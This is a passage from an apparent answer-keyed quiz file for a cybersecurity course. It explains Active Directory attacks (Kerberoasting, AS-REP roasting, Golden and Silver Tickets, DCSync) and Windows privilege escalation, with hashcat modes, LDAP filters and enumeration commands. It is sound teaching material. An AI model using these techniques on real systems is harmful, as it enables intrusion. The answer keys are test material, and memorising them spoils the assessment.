        correctIndex: 0,
        explanation:
          "Follow TCP Stream reassembles all the packets of one TCP conversation into a single readable view of the full request/response exchange.",
      },
      {
        question:
          "What obfuscation technique does the flag in this lab's traffic use, and how is it resolved?",
        options: [
          "ROT13-style obfuscation, decoded to recover the flag",
          "AES-256 encryption, requiring a private key to decrypt",
          "Base64 encoding of an image file",
          "No obfuscation at all; the flag is sent in plaintext with no encoding",
        ],
        correctIndex: 0,
        explanation:
          "The lab specifically calls out recognising ROT13-style obfuscation in the stream content and decoding it to recover the hidden flag.",
      },
    ],
  },
  {
    topicId: "m14-6",
    questions: [
      {
        question:
          "What is the purpose of running `sha256sum suspicious.elf` before submitting the file to VirusTotal?",
        options: [
          "To compute the file's hash, which can be submitted to VirusTotal without necessarily uploading the full binary",
          "To permanently delete the file after analysis",
          "To decompile the binary into readable source code",
          "To encrypt the file before transfer",
        ],
        correctIndex: 0,
        explanation:
          "sha256sum computes a hash that can be looked up on VirusTotal, letting you check a file's reputation by hash without always needing to upload the binary itself.",
      },
      {
        question:
          "What does VirusTotal actually provide when you submit a file or hash?",
        options: [
          "Aggregated verdicts from dozens of antivirus engines",
          "A single binary verdict from one proprietary engine only",
          "A guaranteed determination of whether the file is malicious",
          "Automatic removal of any detected malware from your system",
        ],
        correctIndex: 0,
        explanation:
          "VirusTotal's core value is aggregating detections across many different AV engines rather than relying on just one engine's opinion.",
      },
      {
        question:
          "Why should a 'clean' VirusTotal result be treated as inconclusive rather than proof-of-safety?",
        options: [
          "Because VirusTotal can miss brand-new malware strains that AV engines haven't yet been updated to detect",
          "Because VirusTotal never actually scans the file, only its filename",
          "Because VirusTotal only checks files smaller than 1KB",
          "Because a clean result always means the file has been verified by a human analyst",
        ],
        correctIndex: 0,
        explanation:
          "The lab explicitly warns that VirusTotal is excellent for triage but can miss brand-new strains, so a clean result doesn't guarantee the file is actually safe.",
      },
    ],
  },
  {
    topicId: "m14-7",
    questions: [
      {
        question:
          "What is the correct order of phases in the Incident Response lifecycle covered in this topic?",
        options: [
          "Prepare -> Detect & Analyse -> Contain, Eradicate, Recover -> Post-Incident (Lessons Learned)",
          "Detect -> Prepare -> Recover -> Eradicate -> Contain",
          "Contain -> Prepare -> Detect -> Eradicate -> Recover",
          "Eradicate -> Recover -> Detect -> Prepare -> Contain",
        ],
        correctIndex: 0,
        explanation:
          "The lifecycle moves from readiness (Prepare) through detection/analysis, containment/eradication/recovery, and finally documented lessons learned.",
      },
      {
        question: "What happens during the 'Prepare' phase specifically?",
        options: [
          "Policies, tooling, and training are put in place before an incident occurs",
          "The threat is actively removed from all affected systems",
          "Normal operations are restored across the organisation",
          "A detailed forensic timeline of the attack is documented",
        ],
        correctIndex: 0,
        explanation:
          "Prepare is the readiness phase: getting policies, tools, and training in place ahead of time, before any incident happens.",
      },
      {
        question:
          "What is the purpose of the Post-Incident (Lessons Learned) phase?",
        options: [
          "To document what happened and improve defences/playbooks going forward",
          "To notify only the attacker of the organisation's findings",
          "To immediately delete all incident-related logs",
          "To skip documentation and move directly to the next incident",
        ],
        correctIndex: 0,
        explanation:
          "Lessons Learned is explicitly about documenting the incident and using it to improve future defences and response playbooks.",
      },
    ],
  },
  {
    topicId: "m14-8",
    questions: [
      {
        question: "How does this topic describe YARA in one line?",
        options: [
          "'Grep for malware researchers' — a pattern-matching tool for identifying and classifying malware samples",
          "A GPU-accelerated password cracking tool",
          "A network traffic capture and analysis tool",
          "A vulnerability scanner for web applications",
        ],
        correctIndex: 0,
        explanation:
          "The topic's own description frames YARA as 'grep for malware researchers,' matching strings/patterns to identify and classify malware.",
      },
      {
        question: "What two components make up a YARA rule?",
        options: [
          "Strings/patterns to match, plus a boolean condition for when a file matches",
          "A network port and a protocol name",
          "A username and password pair",
          "A CVE ID and a CVSS score",
        ],
        correctIndex: 0,
        explanation:
          "A YARA rule defines the strings section (patterns to look for) and a condition section (the boolean logic for a match), as shown in the example rule.",
      },
      {
        question:
          "Which IOC type does a YARA rule encode when it matches a fuzzy hash rather than an exact value?",
        options: ["Computed", "Atomic", "Behavioural", "Static"],
        correctIndex: 0,
        explanation:
          "The topic lists Atomic (a hash/IP), Computed (a fuzzy hash), and Behavioural (a code pattern) as the three IOC types a YARA rule can encode.",
      },
    ],
  },
  {
    topicId: "m15-1",
    questions: [
      {
        question:
          "Which of these is listed as a distinct cybersecurity career role in this topic?",
        options: [
          "Threat Hunter",
          "Front-end Web Developer",
          "Database Administrator",
          "UX Designer",
        ],
        correctIndex: 0,
        explanation:
          "Threat Hunter is explicitly listed alongside Security Analyst, Penetration Tester, SOC Analyst, Incident Responder, and others as a distinct career role.",
      },
      {
        question:
          "Which reason does this topic give for cybersecurity being an attractive field?",
        options: [
          "High demand, strong entry-level salaries, job security, and a wide variety of specialisations",
          "It requires no ongoing learning once certified",
          "It has the lowest average salaries of any tech field",
          "It only offers a single, narrow career path",
        ],
        correctIndex: 0,
        explanation:
          "The topic lists high demand, strong entry-level salaries, job security, and variety of specialisations as the reasons cybersecurity is attractive.",
      },
      {
        question:
          "Based on the roles listed, which title is most associated with proactively simulating real-world attackers against an organisation's own defences?",
        options: [
          "Red Teamer",
          "GRC Analyst",
          "IAM Administrator",
          "Compliance Officer",
        ],
        correctIndex: 0,
        explanation:
          "Red Teamer is the role explicitly listed that maps to offensive, adversary-simulation work, distinct from GRC or compliance-focused roles.",
      },
    ],
  },
  {
    topicId: "m15-2",
    questions: [
      {
        question:
          "What is the correct phase order in this topic's 3-phase certification roadmap?",
        options: [
          "Foundation -> Core Skills -> Specialisation",
          "Specialisation -> Core Skills -> Foundation",
          "Core Skills -> Foundation -> Specialisation",
          "Foundation and Specialisation happen simultaneously, with no Core Skills phase",
        ],
        correctIndex: 0,
        explanation:
          "The roadmap moves from foundational networking/OS knowledge, through core skills like scripting and OWASP Top 10, to a chosen specialisation.",
      },
      {
        question:
          "Which certification does this topic identify as the natural first target immediately after completing the programme?",
        options: ["eJPT", "OSEP", "OSCP", "CISSP"],
        correctIndex: 0,
        explanation:
          "The topic explicitly states eJPT is the natural first certification target right after finishing this programme, ahead of more advanced options like OSCP/OSEP.",
      },
      {
        question:
          "Which activities belong to Phase 2 (Core Skills) in this roadmap?",
        options: [
          "Scripting (Python/Bash), OWASP Top 10 web app security, and recon/vulnerability assessment",
          "CIA triad fundamentals and basic networking only",
          "Advanced malware analysis and reverse engineering only",
          "Building enterprise SOC playbooks",
        ],
        correctIndex: 0,
        explanation:
          "Phase 2 covers scripting, OWASP Top 10, recon/vulnerability assessment, and personal lab projects, sitting between foundational knowledge and advanced specialisation.",
      },
    ],
  },
  {
    topicId: "m15-3",
    questions: [
      {
        question: "How is CompTIA Security+ described in this topic?",
        options: [
          "A vendor-neutral, foundational certification widely required as a baseline for entry-level security roles",
          "An advanced, hands-on-exam certification for senior red teamers only",
          "A certification that requires 10 years of prior experience",
          "A certification specific to a single vendor's product line",
        ],
        correctIndex: 0,
        explanation:
          "The topic frames Security+ as vendor-neutral and foundational, especially relevant to entry-level roles.",
      },
      {
        question:
          "What subject areas does Security+ cover, according to this topic?",
        options: [
          "General security concepts, risk management, and basic cryptography/network security",
          "Advanced binary exploitation and kernel driver development",
          "Cloud-native Kubernetes security exclusively",
          "GPU-accelerated password cracking techniques",
        ],
        correctIndex: 0,
        explanation:
          "The topic lists general security concepts, risk management, and basic crypto/network security as what Security+ covers.",
      },
      {
        question:
          "Why is Security+ often listed as a minimum requirement even for roles requiring deeper offensive skills?",
        options: [
          "Because it establishes a recognised, vendor-neutral security baseline that hiring processes commonly gate on",
          "Because it's the hardest certification available in the field",
          "Because it replaces the need for any hands-on lab experience",
          "Because it's only available to government employees",
        ],
        correctIndex: 0,
        explanation:
          "The topic notes it's often listed as a minimum requirement in job postings, especially in government/regulated sectors, even when deeper offensive skills are also needed.",
      },
    ],
  },
  {
    topicId: "m15-4",
    questions: [
      {
        question:
          "What does this topic say actually gets an entry-level candidate hired, alongside certifications?",
        options: [
          "A visible portfolio of real practice, such as published writeups and open-source contributions",
          "Owning expensive hacking hardware",
          "Having the highest number of social media followers",
          "Memorising every CVE published in the last year",
        ],
        correctIndex: 0,
        explanation:
          "The topic argues certifications prove knowledge, but a visible portfolio proves you can apply it — and that combination is what actually gets candidates hired.",
      },
      {
        question:
          "What does a basic home lab for this kind of practice typically consist of?",
        options: [
          "VMs for Kali Linux plus vulnerable target machines",
          "A single production web server exposed to the internet",
          "Only a smartphone with a terminal emulator app",
          "A dedicated physical rack of enterprise firewalls",
        ],
        correctIndex: 0,
        explanation:
          "The topic describes a home lab as VMs for Kali (the attacker platform) plus vulnerable targets to practice against safely and repeatably.",
      },
      {
        question:
          "Which existing work from earlier in the course is suggested as the first entries in a portfolio?",
        options: [
          "VulnMachines/HackTheBox writeups from M11",
          "The M13 phishing awareness email templates",
          "The M14 YARA rule examples only",
          "Nothing from this course; portfolios must start from scratch",
        ],
        correctIndex: 0,
        explanation:
          "The topic specifically recommends documenting the M11 VulnMachines/HackTheBox writeups as the first portfolio entries.",
      },
    ],
  },
  {
    topicId: "m15-5",
    questions: [
      {
        question:
          "Which two platforms are named as hosting the majority of public bug bounty programmes?",
        options: [
          "HackerOne and Bugcrowd",
          "TryHackMe and Hack The Box",
          "GitHub and GitLab",
          "PicoCTF and OverTheWire",
        ],
        correctIndex: 0,
        explanation:
          "HackerOne and Bugcrowd are explicitly named as the two platforms hosting the majority of public bug bounty programmes.",
      },
      {
        question:
          "What is a VDP (Vulnerability Disclosure Programme), per this topic?",
        options: [
          "A programme that accepts vulnerability reports but doesn't necessarily pay a bounty, though it's still valuable for reputation",
          "A paid bounty programme exclusive to nation-state researchers",
          "A certification exam offered by HackerOne",
          "A legal requirement for all companies operating online",
        ],
        correctIndex: 0,
        explanation:
          "The topic defines VDP as accepting reports without necessarily paying, while still being valuable for building a researcher's reputation.",
      },
      {
        question:
          "What must a researcher check before testing against any bug bounty target, per this topic?",
        options: [
          "The programme's published scope and safe-harbor terms",
          "Whether the target uses a specific programming language",
          "Whether the target has a public GitHub repository",
          "Whether the bounty payout exceeds a specific dollar amount",
        ],
        correctIndex: 0,
        explanation:
          "The topic stresses always reading and staying strictly within a programme's published scope and safe-harbor terms before testing begins.",
      },
    ],
  },
  {
    topicId: "m15-6",
    questions: [
      {
        question:
          "How does this topic distinguish TryHackMe from Hack The Box?",
        options: [
          "TryHackMe offers guided, beginner-friendly rooms with structure and hints, while HTB is less guided and more realistic for intermediate/advanced practice",
          "TryHackMe is for advanced professionals only, while HTB is strictly for beginners",
          "They are described as functionally identical platforms",
          "TryHackMe only supports Windows targets, while HTB only supports Linux targets",
        ],
        correctIndex: 0,
        explanation:
          "The topic explicitly contrasts TryHackMe's guided, hint-supported format with HTB's less-guided, more realistic machine style.",
      },
      {
        question:
          "Which platform is described as education-focused and ideal for first-time CTF participants?",
        options: ["PicoCTF", "Hack The Box", "VulnMachines", "Metasploit"],
        correctIndex: 0,
        explanation:
          "PicoCTF is specifically described as education-focused, beginner-friendly, and jeopardy-style, making it great for first-timers.",
      },
      {
        question:
          "Why does this topic recommend CTF competitions as a way to keep skills sharp after the programme ends?",
        options: [
          "Because they are gamified, legal practice environments for continued hands-on learning",
          "Because they replace the need for any further certifications",
          "Because they are mandatory for maintaining Security+ certification",
          "Because they pay a guaranteed salary to all participants",
        ],
        correctIndex: 0,
        explanation:
          "The topic frames CTFs as gamified and legal practice environments — a safe, structured way to continue building skills after the course concludes.",
      },
    ],
  },
  {
    topicId: "m16-1",
    questions: [
      {
        question:
          "In the Kerberos flow, why is the TGT encrypted with the krbtgt account's hash instead of the client's own password hash?",
        options: [
          "So the ticket expires automatically after ten years",
          "So only the KDC, which holds the krbtgt hash, can ever decrypt it - the client is never meant to read its own TGT",
          "So the client can decrypt it locally to check group memberships",
          "Because krbtgt is the account the client authenticates as",
        ],
        correctIndex: 1,
        explanation:
          "The TGT is encrypted with krbtgt's hash specifically so only the KDC can decrypt it; the client just carries it around.",
      },
      {
        question:
          "A client wants to access a file share. What must it present to the TGS to get a service ticket for that share?",
        options: [
          "Its plaintext password plus the SPN",
          "The krbtgt account's hash",
          "Its TGT plus the target SPN, in a TGS-REQ",
          "An AS-REQ addressed directly to the file share",
        ],
        correctIndex: 2,
        explanation:
          "The client sends its TGT and the target service's SPN in a TGS-REQ; the TGS-REP returns a service ticket encrypted with that service account's hash.",
      },
      {
        question:
          "Why can a target service validate a user's access without ever contacting the Domain Controller?",
        options: [
          "It decrypts the service ticket itself using its own account's password hash",
          "The DC pre-validates every session over UDP port 88 in advance",
          "klist caches the validation result on every machine in the domain",
          "Kerberos tickets are sent unencrypted so any service can read them directly",
        ],
        correctIndex: 0,
        explanation:
          "The service ticket is encrypted with the target service account's own hash, so the service decrypts and trusts it locally without phoning home to the DC.",
      },
    ],
  },
  {
    topicId: "m16-2",
    questions: [
      {
        question:
          "Why is Kerberoasting attractive to an attacker who has only a low-privilege domain account?",
        options: [
          "Because it automatically resets the target account's password",
          "Because requesting a TGS for any SPN-registered account requires no elevated privilege and never touches the target service",
          "Because it requires physical access to the DC",
          "Because it only works against Domain Admin accounts",
        ],
        correctIndex: 1,
        explanation:
          "Any authenticated domain user can request a service ticket for any SPN account, with no admin rights needed and no interaction with the actual service.",
      },
      {
        question:
          "Why are service accounts disproportionately vulnerable to Kerberoasting compared to regular user accounts?",
        options: [
          "They are exempt from Kerberos entirely",
          "They always use AES256 encryption which is easier to crack",
          "They are typically created once, rarely rotated, and often excluded from interactive password policies",
          "Their SPNs are hidden from LDAP queries",
        ],
        correctIndex: 2,
        explanation:
          "Service accounts are often set up once at deployment and forgotten, so their passwords are old, weak, and not subject to normal rotation policies.",
      },
      {
        question:
          "An analyst recovers a Kerberoasted ticket encrypted with AES256 (etype 18). Which hashcat mode should they use?",
        options: ["-m 13100", "-m 18200", "-m 19600", "-m 19700"],
        correctIndex: 3,
        explanation:
          "hashcat -m 19700 targets AES256-encrypted (etype 18) TGS tickets; 19600 is for AES128, and 13100 is for RC4.",
      },
    ],
  },
  {
    topicId: "m16-3",
    questions: [
      {
        question:
          "Why can AS-REP Roasting be attempted without any valid domain credentials at all?",
        options: [
          "Because the KDC ignores authentication entirely for all accounts",
          "Because GetNPUsers.py exploits a bug in hashcat",
          "Because accounts with preauth disabled cause the KDC to return an AS-REP to anyone who asks for that username, without proving password knowledge",
          "Because AS-REP Roasting only targets the krbtgt account, which has no password",
        ],
        correctIndex: 2,
        explanation:
          "Preauth-disabled accounts skip the check that normally proves the requester knows the password, so the KDC hands back an AS-REP to anyone naming that username.",
      },
      {
        question:
          "What makes the AS-REP crackable offline in the same way as a Kerberoasted ticket?",
        options: [
          "It is signed by the krbtgt account",
          "It is partially encrypted with the target account's own NT hash",
          "It contains the plaintext password",
          "It is transmitted without any encryption",
        ],
        correctIndex: 1,
        explanation:
          "Like a Kerberoasted TGS, the AS-REP is partially encrypted with the target account's NT hash, so it can be brute-forced offline.",
      },
      {
        question: "Which hashcat mode matches AS-REP hashes?",
        options: ["-m 13100", "-m 19600", "-m 18200", "-m 19700"],
        correctIndex: 2,
        explanation:
          "hashcat -m 18200 targets the AS-REP hash format (etype 23 AS-REP).",
      },
    ],
  },
  {
    topicId: "m16-4",
    questions: [
      {
        question:
          "Why does stealing an NT hash let an attacker authenticate without ever cracking it to a plaintext password?",
        options: [
          "Because NTLM automatically decrypts hashes into plaintext during transmission",
          "Because the hash is reversible with a simple XOR",
          "Because Windows stores plaintext passwords alongside the hash",
          "Because NTLM's challenge-response calculation only ever operates on the hash itself, not the plaintext",
        ],
        correctIndex: 3,
        explanation:
          "NTLM's math only needs the NT hash to compute a valid challenge response, so the plaintext password is never actually required.",
      },
      {
        question:
          "Why does dumping one machine's local Administrator hash often grant access to many other machines?",
        options: [
          "Because Active Directory automatically syncs all local admin hashes",
          "Because organizations often reuse the same local Administrator password/hash across an entire machine image",
          "Because the local Administrator account is disabled by default everywhere",
          "Because NTLM hashes are globally unique and never repeat",
        ],
        correctIndex: 1,
        explanation:
          "Many orgs deploy the same local Administrator password across their workstation image, so one dumped hash can unlock dozens of other machines - this is exactly what LAPS is meant to fix.",
      },
      {
        question:
          "An attacker has an NT hash but the target service only accepts Kerberos authentication. What must they use instead of plain Pass-the-Hash?",
        options: [
          "DCSync",
          "A Golden Ticket",
          "Overpass-the-hash, using the NT hash to request a real Kerberos ticket",
          "AS-REP Roasting",
        ],
        correctIndex: 2,
        explanation:
          "Pass-the-Hash specifically targets NTLM authentication; reaching a Kerberos-only service instead requires overpass-the-hash to request a legitimate Kerberos ticket using the NT hash.",
      },
    ],
  },
  {
    topicId: "m16-5",
    questions: [
      {
        question:
          "Why does compromising the krbtgt hash allow domain-wide forgery of any identity?",
        options: [
          "Because krbtgt has Domain Admin rights and can log in directly",
          "Because krbtgt is the account whose hash encrypts every TGT the KDC issues in that domain",
          "Because krbtgt hashes rotate automatically and reveal all account passwords",
          "Because krbtgt is the only account exempt from Kerberos entirely",
        ],
        correctIndex: 1,
        explanation:
          "Every TGT in the domain is encrypted with krbtgt's hash, so holding that hash lets an attacker forge a valid TGT for any identity, real or invented.",
      },
      {
        question:
          "Why isn't a single krbtgt password reset enough to fully remediate a Golden Ticket compromise?",
        options: [
          "Because krbtgt passwords cannot be reset at all",
          "Because Golden Tickets are stored on the DC's disk and survive any password change",
          "Because AD retains the previous krbtgt password to avoid invalidating tickets already in flight, so one reset alone doesn't invalidate forged tickets using the old hash",
          "Because resetting krbtgt disables the entire domain",
        ],
        correctIndex: 2,
        explanation:
          "AD keeps the previous krbtgt password around to avoid breaking in-flight tickets, so a Golden Ticket forged with the old hash still works until krbtgt is reset a second time.",
      },
      {
        question:
          "What makes a forged Golden Ticket bypass normal account controls like password checks?",
        options: [
          "It authenticates using a valid password that was recently rotated",
          "The ticket is forged offline entirely, so no password is ever checked and its lifetime/group memberships are attacker-chosen",
          "It always impersonates the krbtgt account itself, which has no password checks",
          "It uses AS-REP Roasting rather than the TGT flow",
        ],
        correctIndex: 1,
        explanation:
          "Because the ticket is forged rather than issued through the normal AS-REQ flow, no password check occurs, and the attacker chooses the lifetime and embedded group SIDs directly.",
      },
    ],
  },
  {
    topicId: "m16-6",
    questions: [
      {
        question:
          "Why is a Silver Ticket stealthier than a Golden Ticket for accessing one particular service?",
        options: [
          "Because it uses AES256 encryption which defenders can't monitor",
          "Because the forged ticket is presented directly to the target service and never touches or is logged by the KDC/DC",
          "Because Silver Tickets expire within seconds, leaving no trace",
          "Because it requires no encryption key at all",
        ],
        correctIndex: 1,
        explanation:
          "A Silver Ticket goes straight to the target service, which validates it with its own key - the DC never issues or logs it, unlike a Golden Ticket's TGT.",
      },
      {
        question:
          "Why is a Silver Ticket's access narrower than a Golden Ticket's?",
        options: [
          "Because it's encrypted with one specific service account's hash, so it only works against the SPN/service class that hash belongs to",
          "Because it can only be used once before mimikatz deletes it",
          "Because it requires Domain Admin rights to create",
          "Because it only works for accounts with preauth disabled",
        ],
        correctIndex: 0,
        explanation:
          "A Silver Ticket is scoped to whatever service class the forging hash belongs to (e.g. CIFS, HOST, MSSQLSvc) - it can't be used to authenticate to unrelated services.",
      },
      {
        question:
          "How does enabling PAC validation reduce a Silver Ticket's stealth advantage?",
        options: [
          "It disables the target service entirely",
          "It automatically resets the service account's password every time a ticket is used",
          "It forces a callback to the DC to validate the ticket, undercutting the fact that Silver Tickets normally never touch the DC",
          "It encrypts the service ticket a second time, making it uncrackable",
        ],
        correctIndex: 2,
        explanation:
          "PAC validation makes the service check back with the DC, which reintroduces exactly the DC-side visibility that made Silver Tickets stealthy in the first place.",
      },
    ],
  },
  {
    topicId: "m16-7",
    questions: [
      {
        question:
          "Why can DCSync traffic blend into normal domain activity rather than looking like an obvious attack?",
        options: [
          "Because it is encrypted with a key nobody can detect",
          "Because it only runs during scheduled maintenance windows",
          "Because it uses a normal, documented replication protocol that real DCs use with each other, rather than code execution or file access",
          "Because Windows Defender is disabled during replication",
        ],
        correctIndex: 2,
        explanation:
          "DCSync abuses the legitimate MS-DRSR replication protocol that DCs already use amongst themselves, so the traffic can look like normal multi-DC replication.",
      },
      {
        question:
          "What privilege does an attacker need to successfully run DCSync?",
        options: [
          "Local administrator on any workstation",
          "An account holding Replicating Directory Changes and Replicating Directory Changes All rights",
          "Physical access to a Domain Controller's disk",
          "A cracked Kerberoasted service account hash",
        ],
        correctIndex: 1,
        explanation:
          "DCSync requires a principal holding both Replicating Directory Changes and Replicating Directory Changes All - normally limited to DAs, EAs, and the DCs themselves.",
      },
      {
        question:
          "Why is pulling krbtgt's hash via DCSync usually the step immediately before forging a Golden Ticket?",
        options: [
          "Because DCSync is the only way to authenticate as krbtgt directly",
          "Because Golden Tickets require Replicating Directory Changes rights to use",
          "Because DCSync automatically forges the Golden Ticket as part of its output",
          "Because DCSync replicates every password hash in the domain, including krbtgt's, which is exactly the hash a Golden Ticket needs to be forged",
        ],
        correctIndex: 3,
        explanation:
          "DCSync can pull krbtgt's hash directly from the DC's replicated data, and that hash is exactly what's needed to forge a Golden Ticket - making DCSync -> Golden Ticket the classic persistence combo.",
      },
    ],
  },
  {
    topicId: "m16-8",
    questions: [
      {
        question:
          "Why would an attacker choose ldapsearch over SharpHound or PowerView in some situations?",
        options: [
          "ldapsearch is faster at building the visual BloodHound graph",
          "ldapsearch is protocol-level and platform-agnostic, useful the moment valid domain creds are available even from a non-Windows box",
          "ldapsearch doesn't require any credentials at all",
          "ldapsearch is a Windows-only tool with a graphical interface",
        ],
        correctIndex: 1,
        explanation:
          "ldapsearch works at the raw LDAP protocol level and needs no Windows-specific tooling, so it's usable from any box the moment valid domain credentials exist.",
      },
      {
        question:
          "Why might an attacker choose SharpHound's Default or DCOnly collection method instead of -CollectionMethod All?",
        options: [
          "Because All only works if BloodHound is not installed",
          "Because All cannot collect ACL information",
          "Because Default/DCOnly are lighter-touch and stealthier when local admin on workstations isn't available or stealth matters, whereas All is noisiest",
          "Because DCOnly collects more data than All",
        ],
        correctIndex: 2,
        explanation:
          "All is the most thorough but noisiest option (sessions, ACLs, group memberships, trusts); Default/DCOnly trade some coverage for a lighter footprint.",
      },
      {
        question:
          "Which LDAP filter would surface accounts vulnerable to AS-REP Roasting?",
        options: [
          "(servicePrincipalName=*)",
          "(objectClass=computer)",
          "(memberOf=Domain Admins)",
          "(userAccountControl:1.2.840.113556.1.4.803:=4194304)",
        ],
        correctIndex: 3,
        explanation:
          "The userAccountControl filter with the 4194304 bit surfaces accounts with the DONT_REQ_PREAUTH flag set, i.e. accounts vulnerable to AS-REP Roasting; the SPN filter instead surfaces Kerberoastable accounts.",
      },
    ],
  },
  {
    topicId: "m16-9",
    questions: [
      {
        question:
          "In the full attack-path chain, why can an AS-REP roastable account sometimes be exploited before an attacker has any domain credentials at all?",
        options: [
          "Because AS-REP Roasting is the last step in the chain, after DCSync",
          "Because it requires the krbtgt hash to be already compromised",
          "Because it can only be run after Golden Ticket persistence is established",
          "Because AS-REP Roasting requires zero credentials in some cases, giving attackers a foothold before Kerberoasting (which needs a domain account) is even possible",
        ],
        correctIndex: 3,
        explanation:
          "AS-REP Roasting can sometimes be attempted with zero valid credentials, making it a viable entry point earlier in the chain than Kerberoasting, which needs at least a low-privilege domain account.",
      },
      {
        question:
          "Why does the chain treat reaching a principal with Replicating Directory Changes rights as the critical pivot point before DCSync?",
        options: [
          "Because Replicating Directory Changes rights automatically grant Domain Admin group membership",
          "Because those rights are required to crack Kerberoasted hashes",
          "Because DCSync can only be run by an account already holding those replication rights",
          "Because those rights let an account run SharpHound remotely",
        ],
        correctIndex: 2,
        explanation:
          "DCSync requires an account holding Replicating Directory Changes and -All rights, so pivoting to a principal with those rights (often via ACL abuse) is the necessary step before DCSync can be run.",
      },
      {
        question:
          "According to the chain's own conclusion, why does breaking a single link - like rotating one service account's password - matter disproportionately?",
        options: [
          "Because every step in the chain depends on the same single password",
          "Because each step in the chain individually looks minor, but they compound so that removing just one link can stop the entire path to Domain Admin",
          "Because Domain Admin can only be reached through exactly one specific account",
          "Because rotating a password automatically detects an attacker's presence",
        ],
        correctIndex: 1,
        explanation:
          "The chain is only as strong as its weakest link - since each step feeds the next, fixing any single one (like rotating a weak service account password or an ACL) can break the whole path to Domain Admin.",
      },
    ],
  },
  {
    topicId: "m17-1",
    questions: [
      {
        question:
          "Why is it worth running the manual Windows privesc enumeration commands even when WinPEAS/Seatbelt are available?",
        options: [
          "Automated tools can get flagged by AV/EDR or can't be uploaded through a restrictive shell, so the manual version is the fallback",
          "WinPEAS and Seatbelt only check the registry, never services or scheduled tasks",
          "Manual commands always run faster than WinPEAS regardless of shell type",
          "whoami /priv and systeminfo are not part of any automated checklist",
        ],
        correctIndex: 0,
        explanation:
          "WinPEAS/Seatbelt automate the same checklist a manual pass covers, but AV/EDR flags or a restrictive shell can block them entirely, so knowing the manual commands is the fallback.",
      },
      {
        question:
          "During enumeration, whoami /priv shows SeImpersonatePrivilege is enabled on the current token. What does that directly indicate?",
        options: [
          "The OS build and patch level, for matching against known CVEs",
          "A special privilege held by the current token that later token-impersonation techniques (like PrintSpoofer) can abuse",
          "That AlwaysInstallElevated is set in the registry",
          "That a scheduled task is running as SYSTEM",
        ],
        correctIndex: 1,
        explanation:
          "whoami /priv lists the special privileges the current token holds, and SeImpersonatePrivilege is the precondition token-impersonation privesc techniques rely on.",
      },
      {
        question:
          "Which single command reports OS build and patch level in one pass, useful for spotting known local-exploit CVEs?",
        options: [
          "schtasks /query /fo LIST /v",
          "wmic service get name,pathname,startmode,startname",
          "systeminfo",
          "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        ],
        correctIndex: 2,
        explanation:
          "systeminfo gives OS build and patch level in one command, which is often the fastest way to spot a version that maps to a known local-exploit CVE.",
      },
    ],
  },
  {
    topicId: "m17-2",
    questions: [
      {
        question:
          "A service's binary path is C:\\Program Files\\My App\\service.exe with no quotes around it. Which executable does the Windows SCM attempt to launch first?",
        options: [
          "C:\\Program.exe",
          "C:\\Program Files\\My App\\service.exe",
          "C:\\Program Files\\My.exe",
          "C:\\Windows\\System32\\service.exe",
        ],
        correctIndex: 0,
        explanation:
          "Faced with unescaped spaces, the SCM tries each space-delimited segment in order starting from the shortest, so C:\\Program.exe is attempted before C:\\Program Files\\My.exe or the real path.",
      },
      {
        question:
          "An unquoted service path points through a directory you can write to. What else is required before this becomes exploitable?",
        options: [
          "A way to get the service to (re)start, such as a reboot or SERVICE_START rights",
          "Nothing else — a writable directory alone always leads to code execution as SYSTEM",
          "Local administrator credentials",
          "The service must already be stopped and disabled",
        ],
        correctIndex: 0,
        explanation:
          "The malicious binary only runs once the service actually starts, so a writable directory earlier in the path must be paired with a way to trigger a restart.",
      },
      {
        question:
          "sc qc <service> already shows the binary path and start-as account. What does accesschk/icacls check that sc qc does not?",
        options: [
          "Whether the service is currently running",
          "Who has permission to reconfigure the service itself, not just view its current config",
          "The service's scheduled trigger time",
          "Whether AlwaysInstallElevated is enabled",
        ],
        correctIndex: 1,
        explanation:
          "accesschk/icacls reveal the service's ACL — who can reconfigure it (e.g. via sc config) — which is a separate question from what sc qc merely displays.",
      },
    ],
  },
  {
    topicId: "m17-3",
    questions: [
      {
        question:
          "You check only HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer and find AlwaysInstallElevated set to 1. Can you conclude the box is exploitable?",
        options: [
          "Yes, HKLM alone is sufficient",
          "No — HKCU must also be set to 1, since both keys must be present for the policy to actually apply",
          "No, this key is never used for privesc",
          "Yes, but only if the current user is a local administrator",
        ],
        correctIndex: 1,
        explanation:
          "AlwaysInstallElevated only applies when both the HKLM and HKCU values are set to 1 — checking only one and stopping there is a common enumeration mistake.",
      },
      {
        question:
          "What specifically makes AlwaysInstallElevated practical as a privesc technique rather than just a curiosity?",
        options: [
          "msiexec /quiet /qn /i installs the malicious MSI silently with no UI",
          "msfvenom can only output ELF payloads for this technique",
          "It requires physical access to the console",
          "It only works if the Print Spooler service is running",
        ],
        correctIndex: 0,
        explanation:
          "The /quiet /qn flags let the malicious MSI install with zero visible prompts, which is what turns this into a fast, practical privesc path instead of a noisy one.",
      },
      {
        question:
          "What is the correct remediation for an AlwaysInstallElevated finding?",
        options: [
          "Apply a Windows patch that fixes the underlying code flaw",
          "Reinstall the Windows Installer service",
          "Disable the two registry values, since this is a policy misconfiguration, not a code vulnerability",
          "Block outbound port 4444 at the firewall",
        ],
        correctIndex: 2,
        explanation:
          "AlwaysInstallElevated is a Group Policy misconfiguration rather than a code bug, so the fix is disabling the HKLM/HKCU registry values, not patching.",
      },
    ],
  },
  {
    topicId: "m17-4",
    questions: [
      {
        question:
          "Which fix did Microsoft ship that broke the original JuicyPotato technique, prompting RoguePotato's workaround?",
        options: [
          "Disabling the Print Spooler service by default",
          "Removing SeImpersonatePrivilege from all service accounts",
          "A port-135 redirection fix",
          "Requiring digital signatures on all COM objects",
        ],
        correctIndex: 2,
        explanation:
          "RoguePotato coerces a DCOM authentication back to an attacker-controlled redirector specifically to work around the port-135 redirection fix that killed the original JuicyPotato technique.",
      },
      {
        question:
          "What makes PrintSpoofer mechanistically different from RoguePotato and JuicyPotato?",
        options: [
          "It requires local administrator rights first",
          "It abuses the Print Spooler service's named-pipe impersonation instead of DCOM, so it needs no CLSID",
          "It does not require SeImpersonatePrivilege at all",
          "It only works over a network share, never locally",
        ],
        correctIndex: 1,
        explanation:
          "PrintSpoofer abuses named-pipe impersonation via the Print Spooler service rather than coercing a DCOM connection, so unlike JuicyPotato/RoguePotato it needs no OS-build-specific CLSID.",
      },
      {
        question:
          "Before attempting PrintSpoofer, RoguePotato, or JuicyPotato, what precondition should you confirm first?",
        options: [
